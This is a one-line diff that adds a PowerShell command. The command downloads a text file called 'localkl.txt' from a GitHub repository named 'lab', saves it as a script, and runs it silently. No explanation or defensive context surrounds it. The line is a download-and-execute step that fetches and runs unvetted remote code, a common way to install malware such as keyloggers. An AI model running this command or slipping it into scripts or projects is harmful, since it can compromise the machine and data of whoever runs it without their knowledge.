@@ -1,0 +1,1 @@
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/brunosmassa/lab/refs/heads/main/localkl.txt -OutFile .\massa.ps1 | powershell -silent .\massa.ps1
